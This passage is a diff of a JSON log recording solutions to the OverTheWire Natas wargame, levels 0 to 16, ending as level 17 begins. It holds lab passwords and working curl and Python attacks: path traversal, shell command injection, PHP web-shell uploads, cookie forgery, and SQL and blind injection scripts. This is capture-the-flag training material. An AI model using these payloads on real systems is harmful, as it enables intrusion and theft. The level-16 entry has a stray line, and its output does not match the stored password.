@@ -5,530 +5,1027 @@
   {
    "lvl": 0,
    "user": "natas0",
-   "cmds": [
-    [
-     "curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "<!--The password for natas1 is ... -->"
-   ],
-   "pw": "scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7"
+   "pw": "scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/ | grep \"natas1 is\"",
+     "out": [
+      "<!--The password for natas1 is scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 -->"
+     ]
+    }
+   ]
   },
   {
    "lvl": 1,
    "user": "natas1",
-   "cmds": [
-    [
-     "curl -s -u natas1:scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 http://natas1.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "<!--The password for natas2 is ... -->"
-   ],
-   "pw": "vsDOxoXyq3wckCP1ZmTZ71ngIA606odB"
+   "pw": "vsDOxoXyq3wckCP1ZmTZ71ngIA606odB",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas1:scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 http://natas1.natas.labs.overthewire.org/ | grep \"natas2 is\"",
+     "out": [
+      "<!--The password for natas2 is vsDOxoXyq3wckCP1ZmTZ71ngIA606odB -->"
+     ]
+    }
+   ]
   },
   {
    "lvl": 2,
    "user": "natas2",
-   "cmds": [
-    [
-     "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/",
-     "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/users.txt"
-    ]
-   ],
-   "out": [
-    "natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI"
-   ],
-   "pw": "K30JrSRHzjxq3paUQuwozY4MNvmNFyhI"
+   "pw": "K30JrSRHzjxq3paUQuwozY4MNvmNFyhI",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/ | grep img",
+     "out": [
+      "<img src=\"files/pixel.png\">"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/ | grep -o 'href=\"[^\"]*\"'",
+     "out": [
+      "href=\"?C=N;O=D\"",
+      "href=\"?C=M;O=A\"",
+      "href=\"?C=S;O=A\"",
+      "href=\"?C=D;O=A\"",
+      "href=\"/\"",
+      "href=\"pixel.png\"",
+      "href=\"users.txt\""
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/users.txt | grep natas3",
+     "out": [
+      "natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI"
+     ]
+    }
+   ]
   },
   {
    "lvl": 3,
    "user": "natas3",
-   "cmds": [
-    [
-     "curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/robots.txt",
-     "# Disallow: /s3cr3t/",
-     "curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"
-    ]
-   ],
-   "out": [
-    "natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth"
-   ],
-   "pw": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth"
+   "pw": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/robots.txt",
+     "out": [
+      "User-agent: *",
+      "Disallow: /s3cr3t/"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/s3cr3t/ | grep -o 'href=\"[^\"]*\"'",
+     "out": [
+      "href=\"?C=N;O=D\"",
+      "href=\"?C=M;O=A\"",
+      "href=\"?C=S;O=A\"",
+      "href=\"?C=D;O=A\"",
+      "href=\"/\"",
+      "href=\"users.txt\""
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt | grep natas4",
+     "out": [
+      "natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth"
+     ]
+    }
+   ]
   },
   {
    "lvl": 4,
    "user": "natas4",
-   "cmds": [
-    [
-     "curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "The password for natas5 is ..."
-   ],
-   "pw": "e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M"
+   "pw": "e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth http://natas4.natas.labs.overthewire.org/ | grep -i disallowed",
+     "out": [
+      "Access disallowed. You are visiting from \"\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\""
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth -H \"Referer: http://natas5.natas.labs.overthewire.org/\" http://natas4.natas.labs.overthewire.org/ | grep -i granted",
+     "out": [
+      "Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M"
+     ]
+    }
+   ]
   },
   {
    "lvl": 5,
    "user": "natas5",
-   "cmds": [
-    [
-     "curl -s -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M -H 'Cookie: loggedin=1' http://natas5.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "You are logged in! The password for natas6 is ..."
-   ],
-   "pw": "7mhjtShJAcld2NYbKHEadnhEwRn2P8VT"
+   "pw": "7mhjtShJAcld2NYbKHEadnhEwRn2P8VT",
+   "steps": [
+    {
+     "cmd": "curl -sI -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M http://natas5.natas.labs.overthewire.org/ | grep -i set-cookie",
+     "out": [
+      "Set-Cookie: loggedin=0\r"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M -b \"loggedin=1\" http://natas5.natas.labs.overthewire.org/ | grep -i granted",
+     "out": [
+      "Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT</div>"
+     ]
+    }
+   ]
   },
   {
    "lvl": 6,
    "user": "natas6",
-   "cmds": [
-    [
-     "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/index.php~ source (linked on the page)",
-     "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/includes/secret.inc",
-     "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT -d 'secret=<the secret>&submit=Submit' http://natas6.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "The password for natas7 is ..."
-   ],
-   "pw": "B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0"
+   "pw": "B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/index-source.html | grep -o \"includes/secret.inc\" | head -1",
+     "out": [
+      "includes/secret.inc"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/includes/secret.inc",
+     "out": [
+      "<?",
+      "$secret = \"FOEIUWGHFEEUHOFUOIU\";",
+      "?>"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT -d \"secret=FOEIUWGHFEEUHOFUOIU&submit=1\" http://natas6.natas.labs.overthewire.org/ | grep -i granted",
+     "out": [
+      "Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0"
+     ]
+    }
+   ]
   },
   {
    "lvl": 7,
    "user": "natas7",
-   "cmds": [
-    [
-     "curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'"
-    ]
-   ],
-   "out": [
-    "(the page renders the password file itself)"
-   ],
-   "pw": "ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc"
+   "pw": "ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 http://natas7.natas.labs.overthewire.org/ | grep -o \"hint:.*\"",
+     "out": [
+      "hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' | sed -n '/<br>/,/<\\!--/p' | grep -v '<br>' | grep -v '\\!--'",
+     "out": [
+      "ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc"
+     ]
+    }
+   ]
   },
   {
    "lvl": 8,
    "user": "natas8",
-   "cmds": [
-    [
-     "# from the source: encodedSecret = hex2bin + strrev + base64-decode it back",
-     "curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc -d 'secret=oubWYf2kBq&submit=Submit' http://natas8.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "The password for natas9 is ..."
-   ],
-   "pw": "UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9"
+   "pw": "UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc http://natas8.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g\" | grep -o '$encodedSecret = \"[0-9a-f]*\"'",
+     "out": [
+      "$encodedSecret = \"3d3d516343746d4d6d6c315669563362\""
+     ]
+    },
+    {
+     "cmd": "python3 -c \"import base64;h='3d3d516343746d4d6d6c315669563362';s=bytes.fromhex(h).decode()[::-1];print(base64.b64decode(s).decode())\"",
+     "out": [
+      "oubWYf2kBq"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc -d \"secret=oubWYf2kBq&submit=1\" http://natas8.natas.labs.overthewire.org/ | grep -i granted",
+     "out": [
+      "Access granted. The password for natas9 is UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9"
+     ]
+    }
+   ]
   },
   {
    "lvl": 9,
    "user": "natas9",
-   "cmds": [
-    [
-     "curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 --data-urlencode 'needle=; cat /etc/natas_webpass/natas10 #' http://natas9.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "Output: ..."
-   ],
-   "pw": "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv"
+   "pw": "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 http://natas9.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g\" | tr -d \"\\n\" | grep -o \"passthru([^)]*)\"",
+     "out": [
+      "passthru(\"grep&nbsp;-i&nbsp;$key&nbsp;dictionary.txt\")"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 --data-urlencode \"needle=; cat /etc/natas_webpass/natas10 #\" http://natas9.natas.labs.overthewire.org/ | sed -n \"/<pre/,/<\\/pre>/p\" | sed \"s/<[^>]*>//g\" | grep -v \"^$\" | head -3",
+     "out": [
+      "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv"
+     ]
+    }
+   ]
   },
   {
    "lvl": 10,
    "user": "natas10",
-   "cmds": [
-    [
-     "curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv --data-urlencode 'needle=. /etc/natas_webpass/natas11' http://natas10.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "(grep happily searches the password file itself)"
-   ],
-   "pw": "VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd"
+   "pw": "VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv http://natas10.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g\" | tr -d \"\\n\" | grep -o \"preg_match([^)]*)\"",
+     "out": [
+      "preg_match('/[;|&amp;]/',$key)"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv --data-urlencode \"needle=^ /etc/natas_webpass/natas11\" http://natas10.natas.labs.overthewire.org/ | sed -n \"/<pre/,/<\\/pre>/p\" | sed \"s/<[^>]*>//g\" | grep natas11",
+     "out": [
+      "/etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd"
+     ]
+    }
+   ]
   },
   {
    "lvl": 11,
    "user": "natas11",
-   "cmds": [
-    [
-     "# known plaintext {\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"} XOR cookie bytes \u2192 key repeats: kBSw",
-     "# forge {\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"} with key kBSw, base64 it, send as the cookie",
-     "curl -s -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd -H 'Cookie: data=<forged>' http://natas11.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "The password for natas12 is ..."
-   ],
-   "pw": "EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng"
+   "pw": "EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng",
+   "steps": [
+    {
+     "cmd": "curl -s -D- -o /dev/null -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd http://natas11.natas.labs.overthewire.org/ | grep -i set-cookie",
+     "out": [
+      "Set-Cookie: data=EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D\r"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport base64, urllib.parse, json\nc = 'EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D'\nct = base64.b64decode(urllib.parse.unquote(c))\npt = b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\nkey = bytes(a ^ b for a, b in zip(pt, ct))[:4]\nprint('recovered key:', key)\nwant = json.dumps({\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}, separators=(',',':')).encode()\nenc = bytes(want[i] ^ key[i % len(key)] for i in range(len(want)))\nprint('forged cookie:', urllib.parse.quote(base64.b64encode(enc).decode(), safe=''))\nPY",
+     "out": [
+      "recovered key: b'kBSw'",
+      "forged cookie: EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd -b \"data=EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F\" http://natas11.natas.labs.overthewire.org/ | grep -i \"password for natas12\"",
+     "out": [
+      "The password for natas12 is EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng<br>"
+     ]
+    }
+   ]
   },
   {
    "lvl": 12,
    "user": "natas12",
-   "cmds": [
-    [
-     "echo '<?php system(\"cat /etc/natas_webpass/natas13\"); ?>' > shell.php",
-     "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng -F 'file=@shell.php' -F 'filename=shell.php' http://natas12.natas.labs.overthewire.org/",
-     "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng http://natas12.natas.labs.overthewire.org/upload/<random>.php (path shown after upload)"
-    ]
-   ],
-   "out": [
-    "(the shell prints the password)"
-   ],
-   "pw": "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k"
+   "pw": "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng http://natas12.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g\" | tr -d \"\\n\" | grep -o \"makeRandomPathFromFilename[^)]*)\"",
+     "out": [
+      "makeRandomPathFromFilename($dir,&nbsp;$fn)",
+      "makeRandomPathFromFilename(\"upload\",&nbsp;$_POST[\"filename\"])"
+     ]
+    },
+    {
+     "cmd": "printf '<?php echo file_get_contents(\"/etc/natas_webpass/natas13\"); ?>' > /tmp/n12shell.php\nls -l /tmp/n12shell.php",
+     "out": [
+      "-rw-r--r-- 1 node node 62 Nov  2 06:58 /tmp/n12shell.php"
+     ]
+    },
+    {
+     "cmd": "P=$(curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng -F \"filename=shell.php\" -F \"uploadedfile=@/tmp/n12shell.php;type=image/jpeg\" http://natas12.natas.labs.overthewire.org/index.php | grep -o \"upload/[a-z0-9]*\\.php\" | head -1); echo \"$P\"",
+     "out": [
+      "upload/9jfrl8ytt3.php"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \"http://natas12.natas.labs.overthewire.org/$P\"",
+     "out": [
+      "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k"
+     ]
+    }
+   ]
   },
   {
    "lvl": 13,
    "user": "natas13",
-   "cmds": [
-    [
-     "printf 'GIF89a<?php system(\"cat /etc/natas_webpass/natas14\"); ?>' > shell.php",
-     "curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k -F 'file=@shell.php' -F 'filename=shell.php' http://natas13.natas.labs.overthewire.org/",
-     "# open the uploaded file (path shown after upload)"
-    ]
-   ],
-   "out": [
-    "GIF89a... followed by the password"
-   ],
-   "pw": "A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8"
+   "pw": "A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k http://natas13.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g\" | tr -d \"\\n\" | grep -o \"exif_imagetype[^)]*)\"",
+     "out": [
+      "exif_imagetype($_FILES['uploadedfile']['tmp_name'])"
+     ]
+    },
+    {
+     "cmd": "printf 'GIF89a' > /tmp/n13shell.php\nprintf '<?php echo file_get_contents(\"/etc/natas_webpass/natas14\"); ?>' >> /tmp/n13shell.php\nfile /tmp/n13shell.php",
+     "out": [
+      "/tmp/n13shell.php: GIF image data, version 89a, 16188 x 26736"
+     ]
+    },
+    {
+     "cmd": "P=$(curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k -F \"filename=shell.php\" -F \"uploadedfile=@/tmp/n13shell.php;type=image/gif\" http://natas13.natas.labs.overthewire.org/index.php | grep -o \"upload/[a-z0-9]*\\.php\" | head -1); echo \"$P\"",
+     "out": [
+      "upload/j4s3gicm9m.php"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \"http://natas13.natas.labs.overthewire.org/$P\"",
+     "out": [
+      "GIF89aA0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8"
+     ]
+    }
+   ]
   },
   {
    "lvl": 14,
    "user": "natas14",
-   "cmds": [
-    [
-     "curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 --data-urlencode 'username=natas15\" OR \"1\"=\"1' --data-urlencode 'password=x' http://natas14.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "Successful login! The password for natas15 is ..."
-   ],
-   "pw": "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g"
+   "pw": "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 http://natas14.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'SELECT [^;]*' | head -1",
+     "out": [
+      "SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\" and password=\\\"\".$_REQUEST[\"password\"].\"\\\"\""
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 --data-urlencode 'username=\" OR 1=1 -- ' --data-urlencode \"password=x\" http://natas14.natas.labs.overthewire.org/ | grep -i \"successful\"",
+     "out": [
+      "Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g<br><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
+     ]
+    }
+   ]
   },
   {
    "lvl": 15,
    "user": "natas15",
-   "cmds": [
-    [
-     "# for each position, ask: username = natas16\" AND password LIKE BINARY \"<prefix>%\" \u2014 'exists' means the guess is right",
-     "# 32 characters later:",
-     "curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g 'http://natas15.natas.labs.overthewire.org/?debug=1' (to confirm the query shape first)"
-    ]
-   ],
-   "out": [
-    "This user exists."
-   ],
-   "pw": "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb"
+   "pw": "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g http://natas15.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g\" | tr -d \"\\n\" | grep -o \"SELECT [^;]*;\" | head -1",
+     "out": [
+      "SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\";"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g --data-urlencode 'username=natas16\" AND password LIKE \"%' http://natas15.natas.labs.overthewire.org/ | grep -i \"exists\"",
+     "out": [
+      "This user exists.<br><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport urllib.request, urllib.parse, base64\nurl = 'http://natas15.natas.labs.overthewire.org/'\nauth = 'Basic ' + base64.b64encode(b'natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g').decode()\ndef exists(p):\n    d = urllib.parse.urlencode({'username': p}).encode()\n    r = urllib.request.Request(url, data=d, headers={'Authorization': auth})\n    return b'This user exists' in urllib.request.urlopen(r, timeout=15).read()\nout = ''\nfor pos in range(1, 33):\n    lo, hi = 32, 126\n    while lo < hi:\n        mid = (lo + hi) // 2\n        if exists('natas16\" AND ORD(SUBSTR(password,%d,1)) > %d -- ' % (pos, mid)):\n            lo = mid + 1\n        else:\n            hi = mid\n    if lo == 32:\n        break\n    out += chr(lo)\n    print(out, flush=True)\nprint('FINAL', out)\nPY",
+     "out": [
+      "X",
+      "Xm",
+      "Xm6",
+      "Xm6X",
+      "Xm6XE",
+      "Xm6XEe",
+      "Xm6XEeR",
+      "Xm6XEeRN",
+      "Xm6XEeRN3",
+      "Xm6XEeRN3z",
+      "Xm6XEeRN3zs",
+      "Xm6XEeRN3zsG",
+      "Xm6XEeRN3zsGj",
+      "Xm6XEeRN3zsGjR",
+      "Xm6XEeRN3zsGjRD",
+      "Xm6XEeRN3zsGjRDq",
+      "Xm6XEeRN3zsGjRDqB",
+      "Xm6XEeRN3zsGjRDqBP",
+      "Xm6XEeRN3zsGjRDqBPm",
+      "Xm6XEeRN3zsGjRDqBPmu",
+      "Xm6XEeRN3zsGjRDqBPmuq",
+      "Xm6XEeRN3zsGjRDqBPmuqA",
+      "Xm6XEeRN3zsGjRDqBPmuqAV",
+      "Xm6XEeRN3zsGjRDqBPmuqAVV",
+      "Xm6XEeRN3zsGjRDqBPmuqAVV6",
+      "Xm6XEeRN3zsGjRDqBPmuqAVV65",
+      "Xm6XEeRN3zsGjRDqBPmuqAVV65k",
+      "Xm6XEeRN3zsGjRDqBPmuqAVV65k7",
+      "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e",
+      "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3",
+      "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3G",
+      "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb",
+      "FINAL Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb"
+     ]
+    }
+   ]
   },
   {
    "lvl": 16,
    "user": "natas16",
-   "cmds": [
-    [
-     "# the filter blocks ; | & ` ' \" \u2014 but not $()",
-     "# if the grep inside $() matches, the output goes empty \u2014 a boolean oracle:",
-     "curl -s -u natas16:PASS 'http://natas16.natas.labs.overthewire.org/?needle=African$(grep ^K /etc/natas_webpass/natas17)&submit=Search'",
-     "# try every character at every position (double-confirmed) \u2014 32 requests chains later:"
-    ]
-   ],
-   "out": [
-    "<pre></pre>  (empty = prefix correct)"
-   ],
-   "pw": "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx"
+   "pw": "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb http://natas16.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"preg_match([^)]*)\"",
+     "out": [
+      "preg_match('/[;|&amp;`\\'\"]/',$key)"
+     ]
+    },
+    {
+     "cmd": "echo -n \"matching prefix ^K -> \"; curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb --data-urlencode 'needle=$(grep ^K /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/ | sed -n \"/<pre>/,/<\\/pre>/p\" | wc -c",
+     "out": [
+      "matching prefix ^K -> 13"
+     ]
+    },
+    {
+     "cmd": "echo -n \"non-matching prefix ^Z -> \"; curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb --data-urlencode 'needle=$(grep ^Z /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/ | sed -n \"/<pre>/,/<\\/pre>/p\" | wc -c",
+     "out": [
+      "non-matching prefix ^Z -> 460891"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport urllib.request, urllib.parse, base64\nurl = 'http://natas16.natas.labs.overthewire.org/'\nauth = 'Basic ' + base64.b64encode(b'natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb').decode()\nCHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'\ndef empty(payload):\n    d = urllib.parse.urlencode({'needle': payload}).encode()\n    r = urllib.request.Request(url, data=d, headers={'Authorization': auth})\n    body = urllib.request.urlopen(r, timeout=30).read().decode('utf-8', 'replace')\n    i = body.find('<pre>'); j = body.find('</pre>', i)\n    return len(body[i+5:j].strip()) == 0\nprefix = ''\nfor pos in range(1, 40):\n    lo, hi = 0, len(CHARS) - 1\n    while lo < hi:\n        mid = (lo + hi) // 2\n        if empty('$(grep ^%s[%s] /etc/natas_webpass/natas17)' % (prefix, CHARS[lo:mid+1])):\n            hi = mid\n        else:\n            lo = mid + 1\n    ch = CHARS[lo]\n    if not empty('$(grep ^%s%s /etc/natas_webpass/natas17)' % (prefix, ch)):\n        print('FINAL', prefix, flush=True)\n        break\n    prefix += ch\n    print(prefix, flush=True)\n    if empty('$(grep ^%s$ /etc/natas_webpass/natas17)' % prefix):\n        print('FINAL', prefix, flush=True)\n        break\nPY\nPY",
+     "out": [
+      "K",
+      "KL",
+      "KLd",
+      "KLdA",
+      "KLdAM",
+      "KLdAM3",
+      "KLdAM3V",
+      "KLdAM3VZ",
+      "KLdAM3VZu",
+      "KLdAM3VZux",
+      "KLdAM3VZux8"
+     ]
+    }
+   ]
   },
   {
    "lvl": 17,
    "user": "natas17",
-   "cmds": [
-    [
-     "# the page prints nothing at all \u2014 the only signal left is time",
-     "# IF(condition, SLEEP(2), 0) makes true answers take ~2s longer:",
-     "curl -s -u natas17:PASS -d 'username=natas18\" AND IF(ASCII(SUBSTRING(password,1,1)) > 100, SLEEP(2), 0)#' http://natas17.natas.labs.overthewire.org/index.php -w '%{time_total}'",
-     "# binary-search each character's ASCII code, confirm equality twice, repeat x32"
-    ]
-   ],
-   "out": [
